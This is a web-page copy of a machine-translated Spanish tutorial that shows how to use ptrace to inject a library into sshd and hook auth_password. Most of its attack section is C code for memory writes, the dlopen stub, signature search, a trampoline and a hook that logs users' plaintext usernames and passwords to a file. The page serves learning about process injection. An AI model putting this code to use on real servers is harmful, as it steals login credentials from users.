<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§ôüèΩ üë©üèæ‚Äç‚úàÔ∏è üèë Una introducci√≥n a ptrace o inyecci√≥n de c√≥digo en sshd por diversi√≥n üèáüèΩ üë®üèΩ‚Äçüé® üë®üèº‚Äçüç≥</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="El objetivo que establec√≠ fue muy simple: aprender la contrase√±a ingresada en sshd usando ptrace. Por supuesto, esta es una tarea algo artificial, ya ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Una introducci√≥n a ptrace o inyecci√≥n de c√≥digo en sshd por diversi√≥n</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430302/"><img src="https://habrastorage.org/webt/ep/w1/el/epw1elpz3alvv_6vifmtdbazam0.png"><br><br>  El objetivo que establec√≠ fue muy simple: aprender la contrase√±a ingresada en sshd usando ptrace.  Por supuesto, esta es una tarea algo artificial, ya que hay muchas otras formas m√°s efectivas de lograr lo que desea (y con una probabilidad mucho menor de obtener <abbr title="Falla de segmentaci√≥n">SEGV</abbr> ), sin embargo, me pareci√≥ genial hacer eso. <br><a name="habracut"></a><br><h1>  ¬øQu√© es ptrace? </h1><br>  Quienes est√©n familiarizados con las inyecciones en Windows probablemente conozcan las funciones <code>VirtualAllocEx()</code> , <code>WriteProcessMemory()</code> , <code>ReadProcessMemory()</code> y <code>CreateRemoteThread()</code> .  Estas llamadas le permiten asignar memoria e iniciar hilos en otro proceso.  En el mundo de Linux, el n√∫cleo nos proporciona <code>ptrace</code> , gracias al cual los depuradores pueden interactuar con el proceso en ejecuci√≥n. <br><br>  Ptrace ofrece varias operaciones de depuraci√≥n √∫tiles, por ejemplo: <br><br><ul><li>  PTRACE_ATTACH: le permite unirse a un solo proceso pausando un proceso depurado </li><li>  PTRACE_PEEKTEXT: le permite leer datos del espacio de direcciones de otro proceso </li><li>  PTRACE_POKETEXT: le permite escribir datos en el espacio de direcciones de otro proceso </li><li>  PTRACE_GETREGS: lee el estado actual de los registros de proceso </li><li>  PTRACE_SETREGS: registra el estado de los registros de proceso </li><li>  PTRACE_CONT: contin√∫a la ejecuci√≥n del proceso depurado </li></ul><br>  Aunque esta no es una lista completa de las caracter√≠sticas de ptrace, sin embargo, me encontr√© con dificultades debido a la falta de funciones que me son familiares en Win32.  Por ejemplo, en Windows, puede asignar memoria en otro proceso utilizando la funci√≥n <code>VirtualAllocEx()</code> , que devuelve un puntero a la memoria reci√©n asignada.  Como esto no existe en ptrace, debe improvisar si desea incrustar su c√≥digo en otro proceso. <br><br>  Bien, pensemos c√≥mo tomar el control de un proceso usando ptrace. <br><br><h1>  Conceptos b√°sicos de Ptrace </h1><br>  Lo primero que debemos hacer es unirnos al proceso que nos interesa.  Para hacer esto, simplemente llame a ptrace con el par√°metro PTRACE_ATTACH: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Esta llamada es simple como un atasco de tr√°fico, acepta el PID del proceso al que queremos unirnos.  Cuando se produce una llamada, se env√≠a una se√±al SIGSTOP, lo que obliga a detener el proceso de inter√©s. <br><br>  Despu√©s de unirse, hay una raz√≥n para guardar el estado de todos los registros antes de comenzar a cambiar algo.  Esto nos permitir√° restaurar el programa m√°s tarde: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oldregs</span></span></span><span class="hljs-class">;</span></span> ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;oldregs);</code> </pre><br>  Luego, necesita encontrar un lugar donde podamos escribir nuestro c√≥digo.  La forma m√°s f√°cil es extraer informaci√≥n del archivo de mapas, que se puede encontrar en procfs para cada proceso.  Por ejemplo, "/ proc / PID / maps" en un proceso sshd en Ubuntu se ve as√≠: <br><br><img src="https://habrastorage.org/webt/me/_2/ug/me_2ugeh7hugdyuqx_xfkp-myuy.png"><br><br>  Necesitamos encontrar el √°rea de memoria asignada con el derecho de ejecuci√≥n (muy probablemente "r-xp").  Tan pronto como encontremos el √°rea que nos conviene, por analog√≠a con los registros, guardamos el contenido, para que luego podamos restaurar el trabajo correctamente: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_PEEKTEXT, pid, addr, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Con ptrace, puede leer una palabra de datos de la m√°quina (32 bits en x86 o 64 bits en x86_64) en la direcci√≥n especificada, es decir, para leer m√°s datos, debe realizar varias llamadas, aumentando la direcci√≥n. <br><br>  <i>Nota: en Linux, tambi√©n hay process_vm_readv () y process_vm_writev () para trabajar con el espacio de direcciones de otro proceso.</i>  <i>Sin embargo, en este art√≠culo me quedar√© con el uso de ptrace.</i>  <i>Si desea hacer algo diferente, es mejor leer sobre estas funciones.</i> <br><br>  Ahora que hemos respaldado el √°rea de memoria que nos gusta, podemos comenzar a sobrescribir: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Al igual que PTRACE_PEEKTEXT, esta llamada solo puede grabar una palabra de m√°quina a la vez en la direcci√≥n especificada.  Adem√°s, escribir m√°s de una palabra de m√°quina requerir√° muchas llamadas. <br><br>  Despu√©s de cargar su c√≥digo, debe transferirle el control.  Para no sobrescribir los datos en la memoria (por ejemplo, la pila), utilizaremos los registros guardados anteriormente: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;r, &amp;oldregs, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(struct user_regs_struct)); <span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our injected code regs.rip = addr_of_injected_code; ptrace(PTRACE_SETREGS, pid, NULL, &amp;r);</span></span></code> </pre><br>  Finalmente, podemos continuar la ejecuci√≥n con PTRACE_CONT: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_CONT, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Pero, ¬øc√≥mo sabemos que nuestro c√≥digo ha terminado de ejecutarse?  Utilizaremos una interrupci√≥n de software, tambi√©n conocida como una instrucci√≥n "int 0x03" que genera SIGTRAP.  Esperaremos esto con waitpid (): <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED);</code> </pre><br>  waitpid (): una llamada de bloqueo que esperar√° a que el proceso se detenga con el identificador PID y escriba el motivo de la detenci√≥n en la variable de estado.  Aqu√≠, por cierto, hay un mont√≥n de macros que simplificar√°n la vida al descubrir la raz√≥n de la parada. <br><br>  Para saber si hubo una parada debido a SIGTRAP (debido a llamar a int 0x03), podemos hacer esto: <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"SIGTRAP received\n"</span></span>); }</code> </pre><br>  En este punto, nuestro c√≥digo incrustado ya se ha ejecutado y todo lo que tenemos que hacer es restaurar el proceso a su estado original.  Restaurar todos los registros: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;origregs);</code> </pre><br>  Luego devolveremos los datos originales en la memoria: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Y desconectarse del proceso: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_DETACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Eso es suficiente teor√≠a.  Pasemos a la parte m√°s interesante. <br><br><h1>  Inyecci√≥n sshd </h1><br>  <i>Tengo que advertir que hay alguna posibilidad de que se caiga sshd, as√≠ que tenga cuidado y no intente verificar esto en el sistema de trabajo y especialmente en el sistema remoto a trav√©s de SSH: D</i> <i><br><br></i>  <i>Adem√°s, hay varias formas mejores de lograr el mismo resultado, lo demuestro exclusivamente como una forma divertida de mostrar el poder de ptrace (estoy de acuerdo en que esto es mejor que la inyecci√≥n en Hello World;)</i> <br><br>  Lo √∫nico que quer√≠a hacer era obtener la combinaci√≥n de inicio de sesi√≥n y contrase√±a al ejecutar sshd cuando el usuario est√° autenticado.  Al ver el c√≥digo fuente, podemos ver algo como esto: <br><br>  <a href="">auth-passwd.c</a> <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">/* * Tries to authenticate the user using password. Returns true if * authentication succeeds. */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">auth_password</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Authctxt *authctxt, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *password)</span></span></span><span class="hljs-function"> </span></span>{ ... }</code> </pre><br>  Parece un gran lugar para tratar de eliminar el nombre de usuario / contrase√±a transmitido por el usuario en texto claro. <br><br>  Queremos encontrar una firma de funci√≥n que nos permita encontrar su [funci√≥n] en la memoria.  Uso mi utilidad de desmontaje favorita, radare2: <br><br><img src="https://habrastorage.org/webt/4r/xx/z_/4rxxz_4bv-g5uoo3fiqsxueeefo.png"><br><br>  Es necesario encontrar una secuencia de bytes que sea √∫nica y ocurra solo en la funci√≥n auth_password.  Para hacer esto, usaremos la b√∫squeda en radare2: <br><br><img src="https://habrastorage.org/webt/aq/ie/qt/aqieqttr95rwwklbsvyiwnh86no.png"><br><br>  Sucedi√≥ que la secuencia <code>xor rdx, rdx; cmp rax, 0x400</code>  <code>xor rdx, rdx; cmp rax, 0x400</code> nuestros requisitos y se encuentra solo una vez en todo el archivo ELF. <br><br>  Como nota ... Si no tiene esta secuencia, aseg√∫rese de tener la √∫ltima versi√≥n, que tambi√©n <a href="">cierra la</a> vulnerabilidad de mediados de 2016. (En la versi√≥n 7.6, esta secuencia tambi√©n es √∫nica: aprox. Por.) <br><br>  El siguiente paso es la inyecci√≥n de c√≥digo. <br><br><h1>  Descargar .so a sshd </h1><br>  Para cargar nuestro c√≥digo en sshd, crearemos un peque√±o c√≥digo auxiliar que nos permitir√° llamar a dlopen () y cargar una biblioteca din√°mica que ya implementar√° la sustituci√≥n de "auth_password". <br><br>  dlopen () es una llamada para la vinculaci√≥n din√°mica, que toma la ruta a la biblioteca din√°mica en argumentos y la carga en el espacio de direcciones del proceso de llamada.  Esta funci√≥n se encuentra en libdl.so, que se vincula din√°micamente a la aplicaci√≥n. <br><br>  Afortunadamente, en nuestro caso, libdl.so ya est√° cargado en sshd, por lo que solo tenemos que ejecutar dlopen ().  Sin embargo, debido a <abbr title="Aleatorizaci√≥n del dise√±o del espacio de direcciones">ASLR, es</abbr> muy poco probable que dlopen () est√© en el mismo lugar cada vez, por lo que debe encontrar su direcci√≥n en la memoria sshd. <br><br>  Para encontrar la direcci√≥n de la funci√≥n, debe calcular el desplazamiento: la diferencia entre la direcci√≥n de la funci√≥n dlopen () y la direcci√≥n inicial de libdl.so: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> libdlAddr, dlopenAddr; libdlAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlopen(<span class="hljs-string"><span class="hljs-string">"libdl.so"</span></span>, RTLD_LAZY); dlopenAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlsym(libdlAddr, <span class="hljs-string"><span class="hljs-string">"dlopen"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Offset: %llx\n"</span></span>, dlopenAddr - libdlAddr);</code> </pre><br>  Ahora que hemos calculado el desplazamiento, necesitamos encontrar la direcci√≥n inicial de libdl.so del archivo de mapas: <br><br><img src="https://habrastorage.org/webt/pm/vu/ja/pmvuja0gax1gdlqv48bwpeiadu0.png"><br><br>  Conociendo la direcci√≥n base de libdl.so en sshd (0x7f0490a0d000, como se muestra en la captura de pantalla anterior), podemos agregar un desplazamiento y obtener la direcci√≥n dlopen () para llamar desde el c√≥digo de inyecci√≥n. <br><br>  Pasaremos todas las direcciones necesarias a trav√©s de los registros usando PTRACE_SETREGS. <br><br>  Tambi√©n es necesario escribir la ruta a la biblioteca implantada en el espacio de direcciones sshd, por ejemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ptraceWrite</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> pid, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> addr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *data, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> word = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; len; i+=<span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word), word=<span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;word, data + i, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"[!] Error writing process memory\n"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } } ptraceWrite(pid, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)freeaddr, <span class="hljs-string"><span class="hljs-string">"/tmp/inject.so\x00"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)</code> </pre><br>  Al hacer todo lo posible durante la preparaci√≥n de la inyecci√≥n y cargar los punteros a los argumentos directamente en los registros, podemos facilitar el c√≥digo de inyecci√≥n.  Por ejemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our code, which will be just after // our injected library name string regs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN; // Update RAX to point to dlopen() regs.rax = (unsigned long long)dlopenAddr; // Update RDI to point to our library name string regs.rdi = (unsigned long long)freeaddr; // Set RSI as RTLD_LAZY for the dlopen call regs.rsi = 2; // RTLD_LAZY // Update the target process registers ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span></span></code> </pre><br>  Es decir, la inyecci√≥n de c√≥digo es bastante simple: <br><br><pre> <code class="cpp hljs">; RSI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as value <span class="hljs-string"><span class="hljs-string">'2'</span></span> (RTLD_LAZY) ; RDI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as <span class="hljs-keyword"><span class="hljs-keyword">char</span></span>* to shared library path ; RAX contains the address of dlopen call rax <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-number"><span class="hljs-number">0x03</span></span></code> </pre><br>  Es hora de crear nuestra biblioteca din√°mica, que se cargar√° con el c√≥digo de inyecci√≥n. <br><br>  Antes de continuar, considere una cosa importante que se utilizar√° ... El constructor de la biblioteca din√°mica. <br><br><h1>  Constructor en bibliotecas din√°micas. </h1><br>  Las bibliotecas din√°micas pueden ejecutar c√≥digo al cargar.  Para hacer esto, marque las funciones con el decodificador "__attribute __ ((constructor))".  Por ejemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void __attribute__((constructor)) test(void) { printf("Library loaded on dlopen()\n"); }</span></span></span></span></code> </pre> <br>  Puede copiar usando un comando simple: <br><br><pre> <code class="bash hljs">gcc -o test.so --shared -fPIC test.c</code> </pre><br>  Y luego verifique el rendimiento: <br><br><pre> <code class="cpp hljs">dlopen(<span class="hljs-string"><span class="hljs-string">"./test.so"</span></span>, RTLD_LAZY);</code> </pre><br>  Cuando se carga la biblioteca, tambi√©n se llamar√° al constructor: <br><br><img src="https://habrastorage.org/webt/c1/ez/ao/c1ezaodwm4j0tk8mmqmhwhjbl5i.png"><br><br>  Tambi√©n utilizamos esta funcionalidad para hacernos la vida m√°s f√°cil al inyectar c√≥digo en el espacio de direcciones de otro proceso. <br><br><h1>  Biblioteca din√°mica sshd </h1><br>  Ahora que tenemos la oportunidad de cargar nuestra biblioteca din√°mica, necesitamos crear un c√≥digo que cambie el comportamiento de auth_password () en tiempo de ejecuci√≥n. <br><br>  Cuando se carga nuestra biblioteca din√°mica, podemos encontrar la direcci√≥n de inicio de sshd usando el archivo "/ proc / self / maps" en procfs.  Estamos buscando un √°rea con permisos "rx" en la que buscaremos una secuencia √∫nica en auth_password (): <br><br><pre> <code class="cpp hljs">d = fopen(<span class="hljs-string"><span class="hljs-string">"/proc/self/maps"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(fgets(buffer, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(buffer), fd)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"/sshd"</span></span>) &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"rx"</span></span>)) { ptr = strtoull(buffer, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); end = strtoull(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"-"</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre><br>  Como tenemos un rango de direcciones para buscar, estamos buscando una funci√≥n: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *search = <span class="hljs-string"><span class="hljs-string">"\x31\xd2\x48\x3d\x00\x04\x00\x00"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(ptr &lt; end) { <span class="hljs-comment"><span class="hljs-comment">// ptr[0] == search[0] added to increase performance during searching // no point calling memcmp if the first byte doesn't match our signature. if (ptr[0] == search[0] &amp;&amp; memcmp(ptr, search, 9) == 0) { break; } ptr++; }</span></span></code> </pre><br>  Cuando encontramos una coincidencia, debe usar mprotect () para cambiar los permisos en el √°rea de memoria.  Todo esto se debe a que el √°rea de memoria es legible y ejecutable, y se requieren permisos de escritura para los cambios sobre la marcha: <br><br><pre> <code class="cpp hljs">mprotect((<span class="hljs-keyword"><span class="hljs-keyword">void</span></span>*)(((<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr / <span class="hljs-number"><span class="hljs-number">4096</span></span>) * <span class="hljs-number"><span class="hljs-number">4096</span></span>), <span class="hljs-number"><span class="hljs-number">4096</span></span>*<span class="hljs-number"><span class="hljs-number">2</span></span>, PROT_READ | PROT_WRITE | PROT_EXEC)</code> </pre><br>  Bueno, tenemos derecho a escribir en el √°rea de memoria deseada y ahora es el momento de agregar un peque√±o trampol√≠n al comienzo de la funci√≥n auth_password, que pasar√° el control al gancho: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">char</span></span> jmphook[] = <span class="hljs-string"><span class="hljs-string">"\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0"</span></span>;</code> </pre><br>  Esto es equivalente a este c√≥digo: <br><br><pre> <code class="cpp hljs">mov rax, <span class="hljs-number"><span class="hljs-number">0x4142434445464748</span></span> jmp rax</code> </pre> <br>  Por supuesto, la direcci√≥n 0x4142434445464748 no es adecuada para nosotros y ser√° reemplazada por la direcci√≥n de nuestro gancho: <br><br><pre> <code class="cpp hljs">*(<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> *)((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)jmphook+<span class="hljs-number"><span class="hljs-number">2</span></span>) = &amp;passwd_hook;</code> </pre> <br>  Ahora podemos insertar nuestro trampol√≠n en sshd.  Para que la inyecci√≥n sea bella y limpia, inserte el trampol√≠n al comienzo de la funci√≥n: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Step back to the start of the function, which is 32 bytes // before our signature ptr -= 32; memcpy(ptr, jmphook, sizeof(jmphook));</span></span></code> </pre><br>  Ahora tenemos que implementar un enlace que se encargar√° del registro de los datos que pasan.  Debemos asegurarnos de haber guardado todos los registros antes del inicio del enlace y restaurarlos antes de volver al c√≥digo original: <br><br><div class="spoiler">  <b class="spoiler_title">C√≥digo fuente de gancho</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Remember the prolog: push rbp; mov rbp, rsp; // that takes place when entering this function void passwd_hook(void *arg1, char *password) { // We want to store our registers for later asm("push %rsi\n" "push %rdi\n" "push %rax\n" "push %rbx\n" "push %rcx\n" "push %rdx\n" "push %r8\n" "push %r9\n" "push %r10\n" "push %r11\n" "push %r12\n" "push %rbp\n" "push %rsp\n" ); // Our code here, is used to store the username and password char buffer[1024]; int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND); // Note: The magic offset of "arg1 + 32" contains a pointer to // the username from the passed argument. snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password); write(log, buffer, strlen(buffer)); close(log); asm("pop %rsp\n" "pop %rbp\n" "pop %r12\n" "pop %r11\n" "pop %r10\n" "pop %r9\n" "pop %r8\n" "pop %rdx\n" "pop %rcx\n" "pop %rbx\n" "pop %rax\n" "pop %rdi\n" "pop %rsi\n" ); // Recover from the function prologue asm("mov %rbp, %rsp\n" "pop %rbp\n" ); ...</span></span></code> </pre><br></div></div><br>  Bueno, eso es todo ... en cierto modo ... <br><br>  Desafortunadamente, despu√©s de todo lo que se ha hecho, esto no es todo.  Incluso si falla la inyecci√≥n del c√≥digo sshd, puede notar que las contrase√±as de usuario que est√° buscando todav√≠a no est√°n disponibles.  Esto se debe al hecho de que sshd para cada conexi√≥n crea un nuevo hijo.  Es el nuevo ni√±o quien procesa la conexi√≥n y es en √©l donde debemos establecer el gancho. <br><br>  Para estar seguro de que estamos trabajando con ni√±os sshd, decid√≠ escanear procfs en busca de archivos de estad√≠sticas que especifiquen el PID padre sshd.  Tan pronto como se encuentra dicho proceso, el inyector comienza por √©l. <br><br>  Incluso hay ventajas para esto.  Si todo sale mal y la inyecci√≥n de c√≥digo cae de SIGSEGV, solo se eliminar√° el proceso de un usuario, y no el proceso sshd principal.  No es el mayor consuelo, pero claramente facilita la depuraci√≥n. <br><br><h1>  Inyecci√≥n en acci√≥n </h1><br>  Ok, veamos la demo: <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v.svg"></a> <br><br>  El c√≥digo completo se puede encontrar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br><br>  Espero que este viaje te haya dado suficiente informaci√≥n para meterte por tu cuenta. <br><br>  Quiero agradecer a las siguientes personas y sitios que ayudaron a lidiar con ptrace: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Kit de herramientas de inyecci√≥n de biblioteca din√°mica Gaffe23</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Gran trabajo de inyecci√≥n EvilSocket</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es430302/">https://habr.com/ru/post/es430302/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es430290/index.html">Un intento de predecir la cuarta iteraci√≥n del proyecto SpaceX BFR</a></li>
